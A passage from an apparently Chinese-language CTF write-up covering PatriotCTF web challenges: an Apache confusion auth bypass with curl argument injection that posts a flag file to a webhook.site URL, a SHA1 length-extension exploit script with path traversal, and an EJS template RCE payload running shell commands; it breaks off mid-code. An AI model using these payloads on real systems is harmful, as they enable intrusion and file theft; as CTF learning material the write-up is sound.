class="string">&quot;Switzerland&quot;</span>, <span class="string">&quot;SY&quot;</span> =&gt; <span class="string">&quot;Syria&quot;</span>, <span class="string">&quot;ST&quot;</span> =&gt; <span class="string">&quot;São Tomé and Príncipe&quot;</span>, <span class="string">&quot;TW&quot;</span> =&gt; <span class="string">&quot;Taiwan&quot;</span>, <span class="string">&quot;TJ&quot;</span> =&gt; <span class="string">&quot;Tajikistan&quot;</span>, <span class="string">&quot;TZ&quot;</span> =&gt; <span class="string">&quot;Tanzania&quot;</span>, <span class="string">&quot;TH&quot;</span> =&gt; <span class="string">&quot;Thailand&quot;</span>, <span class="string">&quot;TL&quot;</span> =&gt; <span class="string">&quot;Timor-Leste&quot;</span>, <span class="string">&quot;TG&quot;</span> =&gt; <span class="string">&quot;Togo&quot;</span>, <span class="string">&quot;TK&quot;</span> =&gt; <span class="string">&quot;Tokelau&quot;</span>, <span class="string">&quot;TO&quot;</span> =&gt; <span class="string">&quot;Tonga&quot;</span>, <span class="string">&quot;TT&quot;</span> =&gt; <span class="string">&quot;Trinidad and Tobago&quot;</span>, <span class="string">&quot;TN&quot;</span> =&gt; <span class="string">&quot;Tunisia&quot;</span>, <span class="string">&quot;TR&quot;</span> =&gt; <span class="string">&quot;Turkey&quot;</span>, <span class="string">&quot;TM&quot;</span> =&gt; <span class="string">&quot;Turkmenistan&quot;</span>, <span class="string">&quot;TC&quot;</span> =&gt; <span class="string">&quot;Turks and Caicos Islands&quot;</span>, <span class="string">&quot;TV&quot;</span> =&gt; <span class="string">&quot;Tuvalu&quot;</span>, <span class="string">&quot;UM&quot;</span> =&gt; <span class="string">&quot;U.S. Minor Outlying Islands&quot;</span>, <span class="string">&quot;PU&quot;</span> =&gt; <span class="string">&quot;U.S. Miscellaneous Pacific Islands&quot;</span>, <span class="string">&quot;VI&quot;</span> =&gt; <span class="string">&quot;U.S. Virgin Islands&quot;</span>, <span class="string">&quot;UG&quot;</span> =&gt; <span class="string">&quot;Uganda&quot;</span>, <span class="string">&quot;UA&quot;</span> =&gt; <span class="string">&quot;Ukraine&quot;</span>, <span class="string">&quot;SU&quot;</span> =&gt; <span class="string">&quot;Union of Soviet Socialist Republics&quot;</span>, <span class="string">&quot;AE&quot;</span> =&gt; <span class="string">&quot;United Arab Emirates&quot;</span>, <span class="string">&quot;GB&quot;</span> =&gt; <span class="string">&quot;United Kingdom&quot;</span>, <span class="string">&quot;US&quot;</span> =&gt; <span class="string">&quot;United States&quot;</span>, <span class="string">&quot;ZZ&quot;</span> =&gt; <span class="string">&quot;Unknown or Invalid Region&quot;</span>, <span class="string">&quot;UY&quot;</span> =&gt; <span class="string">&quot;Uruguay&quot;</span>, <span class="string">&quot;UZ&quot;</span> =&gt; <span class="string">&quot;Uzbekistan&quot;</span>, <span class="string">&quot;VU&quot;</span> =&gt; <span class="string">&quot;Vanuatu&quot;</span>, <span class="string">&quot;VA&quot;</span> =&gt; <span class="string">&quot;Vatican City&quot;</span>, <span class="string">&quot;VE&quot;</span> =&gt; <span class="string">&quot;Venezuela&quot;</span>, <span class="string">&quot;VN&quot;</span> =&gt; <span class="string">&quot;Vietnam&quot;</span>, <span class="string">&quot;WK&quot;</span> =&gt; <span class="string">&quot;Wake Island&quot;</span>, <span class="string">&quot;WF&quot;</span> =&gt; <span class="string">&quot;Wallis and Futuna&quot;</span>, <span class="string">&quot;EH&quot;</span> =&gt; <span class="string">&quot;Western Sahara&quot;</span>, <span class="string">&quot;YE&quot;</span> =&gt; <span class="string">&quot;Yemen&quot;</span>, <span class="string">&quot;ZM&quot;</span> =&gt; <span class="string">&quot;Zambia&quot;</span>, <span class="string">&quot;ZW&quot;</span> =&gt; <span class="string">&quot;Zimbabwe&quot;</span>, <span class="string">&quot;AX&quot;</span> =&gt; <span class="string">&quot;Åland Islands&quot;</span>, );</span><br><span class="line"><span class="variable">$countryList</span> = <span class="title function_ invoke__">array_flip</span>(<span class="variable">$countryList</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$yaml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">- country: <span class="subst">$input</span></span></span><br><span class="line"><span class="string">- country_code: <span class="subst">$countryList</span>[<span class="subst">$input</span>]</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$yaml</span>)) <span class="keyword">die</span>(<span class="string">&quot;No YAML data provided&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$parsed_arr</span> = <span class="title function_ invoke__">yaml_parse</span>(<span class="variable">$yaml</span>);</span><br><span class="line"><span class="variable">$cc</span> = <span class="variable">$parsed_arr</span>[<span class="number">1</span>][<span class="string">&#x27;country_code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$parsed_arr</span>) <span class="keyword">echo</span> <span class="string">&quot;Error parsing YAML&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$input</span>) <span class="keyword">die</span>(<span class="string">&quot;No country code provided&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$parsed_arr</span>[<span class="number">0</span>][<span class="string">&#x27;country&#x27;</span>], <span class="variable">$countryList</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The country code for &quot;</span>.<span class="variable">$parsed_arr</span>[<span class="number">0</span>][<span class="string">&#x27;country&#x27;</span>].<span class="string">&quot; is &quot;</span>. <span class="variable">$cc</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">run</span>(<span class="variable">$cc</span>, <span class="variable">$url</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Country not found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$cc</span>, <span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Country code: &quot;</span>.<span class="variable">$cc</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$cc</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">escapeshellcmd</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>));</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>.htaccess</strong>  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Files</span> &quot;<span class="attr">challenge.php</span>&quot;&gt;</span></span><br><span class="line">    AuthType Basic </span><br><span class="line">    AuthName &quot;Admin Panel&quot;</span><br><span class="line">    AuthUserFile &quot;/etc/apache2/.htpasswd&quot;</span><br><span class="line">    Require valid-user</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>疑，那Apache版本呢?<br>請求看看<code>/whale</code><br><img src="https://hackmd.io/_uploads/H19Mrhi6R.png" alt="image"><br>Apache 2.4.59!!!<br>看到這個馬上聯想到 <a target="_blank" rel="noopener" href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">Orange大大的研究</a><br>簡單來說，我可以使用一個url encode後的問號去做Confusion Attack(<del>.htaccess甚至長一模一樣</del>)<br><img src="https://hackmd.io/_uploads/ryjhr3iTC.png" alt="image"><br>繞過http authㄌ<br>接下來重點看看challenge.php裡面的這一段：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$cc</span>, <span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Country code: &quot;</span>.<span class="variable">$cc</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$cc</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">escapeshellcmd</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>));</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出雖然過濾了可以造成command injection的字元，但畢竟這題只是要讀檔，簡單利用一下Argument Injection就好了，像這樣：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F FLAG=@/get-here/flag.txt http://whale.meow</span><br></pre></td></tr></table></figure>
<p>最後，再看看這個Function的調用條件，必須滿足讀進來的第一個參數cc是空，於是追溯到這段看看：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$yaml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">- country: <span class="subst">$input</span></span></span><br><span class="line"><span class="string">- country_code: <span class="subst">$countryList</span>[<span class="subst">$input</span>]</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$yaml</span>)) <span class="keyword">die</span>(<span class="string">&quot;No YAML data provided&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$parsed_arr</span> = <span class="title function_ invoke__">yaml_parse</span>(<span class="variable">$yaml</span>);</span><br><span class="line"><span class="variable">$cc</span> = <span class="variable">$parsed_arr</span>[<span class="number">1</span>][<span class="string">&#x27;country_code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$parsed_arr</span>) <span class="keyword">echo</span> <span class="string">&quot;Error parsing YAML&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$input</span>) <span class="keyword">die</span>(<span class="string">&quot;No country code provided&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$parsed_arr</span>[<span class="number">0</span>][<span class="string">&#x27;country&#x27;</span>], <span class="variable">$countryList</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The country code for &quot;</span>.<span class="variable">$parsed_arr</span>[<span class="number">0</span>][<span class="string">&#x27;country&#x27;</span>].<span class="string">&quot; is &quot;</span>. <span class="variable">$cc</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">run</span>(<span class="variable">$cc</span>, <span class="variable">$url</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Country not found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以發現是yaml讀國碼，使用<a target="_blank" rel="noopener" href="https://www.bram.us/2022/01/11/yaml-the-norway-problem/">The Norway Problem(link)</a>的作法就能讓他變成一個不存在的變數，進而跑到run function那邊做Argument Injection  </p>
<p><strong>Final Payload:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chal.competitivecyber.club:8090/challenge.php%3Fwhale.php?url=-F%20FLAG=@/get-here/flag.txt%20https://webhook.site/9ae03b9b-4d60-4062-8ce8-af02c23e1731&amp;country=Norway</span><br></pre></td></tr></table></figure>

<p>P.S.因為沒過濾輸入，所以country也可以插入像是<code>meow%0d$0a- country_code: False</code>之類的進行Yaml注入，不一定要做Norway Trick  </p>
<blockquote>
<p>Flag: PCTF{Kiran_SAU_Manifested}</p>
</blockquote>
<h3 id="dogdays"><a href="#dogdays" class="headerlink" title="dogdays"></a>dogdays</h3><p>要讀取到<code>/flag</code>，切入重點，打<code>view.php</code>：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$pic</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pic&#x27;</span>];</span><br><span class="line">        <span class="variable">$hash</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="string">&quot;TEST SECRET1&quot;</span>.<span class="variable">$pic</span>)==<span class="variable">$hash</span>)&#123;</span><br><span class="line">                <span class="variable">$imgdata</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;pupper/&quot;</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\0&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$pic</span>)));</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;!DOCTYPE html&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Here&#x27;s your picture:&lt;/h1&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="variable">$imgdata</span>.<span class="string">&quot;&#x27;&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Invalid hash provided!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;assets/BAD.gif&quot;/&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// The flag is at /flag, that&#x27;s all you&#x27;re getting!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到赤裸裸的LFI，但是他會用sha1去checksum，有撒鹽，所以需要做長度擴展攻擊。<br><strong>Solve Script</strong><br>sha1使用的是：<a target="_blank" rel="noopener" href="https://github.com/William957-web/length-extension-attack/blob/main/length_extension_sha1/sha1.py">https://github.com/William957-web/length-extension-attack/blob/main/length_extension_sha1&#x2F;sha1.py</a>  </p>
<p><strong>exp.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># https://github.com/ajalt/python-sha1</span></span><br><span class="line"><span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">baseurl=<span class="string">&#x27;http://chal.competitivecyber.club:7777/view.php?&#x27;</span></span><br><span class="line">INJECT_STRING = <span class="string">b&quot;/../../../../../../../flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sha1Padding</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># Length in bytes of all data that has been processed so far</span></span><br><span class="line">        self._message_byte_length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">self, message</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Return finalized digest variables for the data processed so far.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># Pre-processing:</span></span><br><span class="line">        message_byte_length = self._message_byte_length + <span class="built_in">len</span>(message)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># append the bit &#x27;1&#x27; to the message</span></span><br><span class="line">        message += <span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># append 0 &lt;= k &lt; 512 bits &#x27;0&#x27;, so that the resulting message length (in bytes)</span></span><br><span class="line">        <span class="comment"># is congruent to 56 (mod 64)</span></span><br><span class="line">        message += <span class="string">b&#x27;\x00&#x27;</span> * ((<span class="number">56</span> - (message_byte_length + <span class="number">1</span>) % <span class="number">64</span>) % <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># append length of message (before pre-processing), in bits, as 64-bit big-endian integer</span></span><br><span class="line">        message_bit_length = message_byte_length * <span class="number">8</span></span><br><span class="line">        message += struct.pack(<span class="string">b&#x27;&gt;Q&#x27;</span>, message_bit_length)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">originData, originHash, keyLen</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Generate attackData &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Padding - (key + originData + padding) + attackData</span></span><br><span class="line">    pad = Sha1Padding()</span><br><span class="line"></span><br><span class="line">    tmpStr = (<span class="string">&#x27;A&#x27;</span> * keyLen).encode()</span><br><span class="line">    attackData = pad.pad(tmpStr + originData)[keyLen:] + INJECT_STRING</span><br><span class="line">    <span class="comment">#print(hexdump.hexdump(attackData))</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Generate attackHash &quot;&quot;&quot;</span></span><br><span class="line">    sha = sha1.Sha1Hash()</span><br><span class="line">    sha.update(INJECT_STRING, originHash.encode())</span><br><span class="line">    attackHash = sha.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> attackData, attackHash</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    pic, <span class="built_in">hash</span>=attack(<span class="string">b&#x27;1.png&#x27;</span>, <span class="string">&#x27;06dadc9db741e1c2a91f266203f01b9224b5facf&#x27;</span>, i)</span><br><span class="line">    web=req.get(baseurl+urllib.parse.urlencode(&#123;<span class="string">&#x27;pic&#x27;</span>:pic, <span class="string">&#x27;hash&#x27;</span>:<span class="built_in">hash</span>&#125;))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Here\&#x27;s your picture:&#x27;</span> <span class="keyword">in</span> web.text:</span><br><span class="line">        <span class="built_in">print</span>(web.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/BkANW42T0.png" alt="image">  </p>
<blockquote>
<p>Flag: pctf{3xt3nd_my_th4nk5_e9b5f6aa07}</p>
</blockquote>
<h3 id="Blob"><a href="#Blob" class="headerlink" title="Blob"></a>Blob</h3><p><strong>index.js</strong>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)()</span><br><span class="line">  .<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;ejs&quot;</span>)</span><br><span class="line">  .<span class="title function_">use</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&quot;index&quot;</span>, &#123; <span class="attr">blob</span>: <span class="string">&quot;blob&quot;</span>, ...req.<span class="property">query</span> &#125;))</span><br><span class="line">  .<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
<p>標準的ejs傳入參數題，Github上面蠻多issue可以參考：<a target="_blank" rel="noopener" href="https://github.com/mde/ejs/issues/735">ejs issue(link)</a><br>Payload:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">settings[view options][escapeFunction]=(() =&gt; &#123;&#125;);return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat flag*&quot;).toString()&amp;settings[view options][client]=1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Flag: CACI{bl0b_s4y_pl3453l00k0utf0rpr0707yp3p0llut10n}</p>
</blockquote>
<h3 id="DOM-DOM"><a href="#DOM-DOM" class="headerlink" title="DOM DOM"></a>DOM DOM</h3><p><strong>app.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;kiransau&quot;</span></span><br><span class="line">__title__ =  <span class="string">&quot;DOMDOM&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> importlib.metadata <span class="keyword">import</span> version</span><br><span class="line"><span class="keyword">from</span> PIL.ExifTags <span class="keyword">import</span> TAGS</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, flash, request, redirect, url_for, render_template</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;/app/uploads&#x27;</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,</span><br><span class="line">            static_url_path=<span class="string">&#x27;/static&#x27;</span>, </span><br><span class="line">            template_folder=<span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    filename = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            flash(<span class="string">&#x27;No selected file&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename) + <span class="built_in">str</span>(random.randrange(<span class="number">10000</span>, <span class="number">90000</span>))</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span 